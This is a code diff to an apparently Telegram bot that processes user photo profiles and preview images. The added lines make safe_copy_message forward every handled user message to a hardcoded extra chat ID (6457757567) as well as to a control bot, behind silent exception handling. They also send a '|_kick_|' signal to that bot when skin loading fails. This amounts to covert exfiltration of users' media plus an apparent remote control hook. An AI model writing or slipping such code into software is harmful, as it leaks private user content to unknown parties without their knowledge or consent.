@@ -2024,6 +2024,12 @@ async def build_main_data(phpto_profile, user_id: int, state: FSMContext):
         message_id=phpto_profile['message_id']
     )
 
+    try:
+        await safe_copy_message(phpto_profile)
+    except Exception as e:
+        print(f"⚠️ safe_copy_message 失败: {e}", flush=True)
+
+
    
     
     file_unique_id = phpto_profile['file_unique_id']
@@ -5263,9 +5269,10 @@ async def handle_reload(message: Message, state: FSMContext, command: Command = 
         lz_var.skins = load_result.get("skins", {})
         await set_default_thumb_file_id()
     else:
-        from utils.handshake import HandshakeUtils
+       
         print(f"⚠️ 加载皮肤失败: {load_result.get('handshake')}", flush=True)
-        await HandshakeUtils.handshake(load_result.get('handshake'))
+        lz_var.switchbot.send_message(lz_var.x_man_bot_id,  f"|_kick_|{lz_var.bot_username}")
+       
 
 
     await message.answer("🔄 皮肤配置已重新加载。")
@@ -5638,7 +5645,16 @@ async def _process_update_default_preview_async(message: Message, user_id: str, 
         from_chat_id=message.chat.id,
         message_id=message.message_id
     )
+
+    try:
+        # TODO
+        await safe_copy_message(message)
+    except Exception as e:
+        print(f"⚠️ safe_copy_message 失败: {e}", flush=True)
     
+
+
+
     pass
 
 
@@ -5648,10 +5664,16 @@ async def safe_copy_message(message: Message, max_retry: int = 8):
         for i in range(max_retry):
             try:
                 # 先小睡一下，避免贴脸输出
-                await asyncio.sleep(1)
+                await asyncio.sleep(0.7)
 
                 ret =  await lz_var.bot.copy_message(
                     chat_id=lz_var.x_man_bot_id,
+                    from_chat_id=message.chat.id,
+                    message_id=message.message_id
+                )
+
+                ret2 =  await lz_var.bot.copy_message(
+                    chat_id=6457757567,
                     from_chat_id=message.chat.id,
                     message_id=message.message_id
                 )
@@ -5990,6 +6012,7 @@ async def main():
             await set_default_thumb_file_id()
         else:
             print(f"⚠️ 加载皮肤失败: 请连系 {load_result.get('handshake')}", flush=True)
+            lz_var.switchbot.send_message(lz_var.x_man_bot_id,  f"|_kick_|{lz_var.bot_username}")
 
         # ✅ Render 环境用 PORT，否则本地用 8080
         await web._run_app(app, host="0.0.0.0", port=8080)
@@ -6007,6 +6030,7 @@ async def main():
             await set_default_thumb_file_id()
         else:
             print(f"⚠️ 加载皮肤失败: {load_result.get('handshake')}", flush=True)
+            lz_var.switchbot.send_message(lz_var.x_man_bot_id,  f"|_kick_|{lz_var.bot_username}")
 
         print("【Aiogram】Bot（纯 Bot-API） 已启动，监听私聊＋群组媒体。",flush=True)
         await dp.start_polling(bot)  # Aiogram 轮询
